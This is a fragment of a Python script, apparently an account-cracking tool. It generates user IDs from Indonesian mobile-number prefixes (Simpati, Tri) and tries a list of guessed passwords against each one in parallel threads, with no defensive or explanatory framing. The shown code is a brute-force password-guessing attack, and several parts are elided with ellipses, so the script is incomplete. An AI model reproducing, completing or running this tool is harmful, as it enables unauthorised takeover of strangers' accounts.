...
#def c():
	...
	print(" \033[1;37m[3] \033[1;34mGROUP")
...
def R():
    ...
    os.system('clear')
    print(logo)
    print('[+] SIMPATI CODE : 0812,0823,0823\n[+] TRI CODE : 0899,0898,0852     ');print('\033[1;37m(•)══════════════════════════════════════════')
    ...
    with ThreadPool(max_workers=30) as yaari:
	    ...
	    for guru in user:
		    uid = kode+guru
		    pwx = [guru,uid,'perdian123','intan123','lukman12345','khan123456','i love you','TRI','salman','sintadewi']
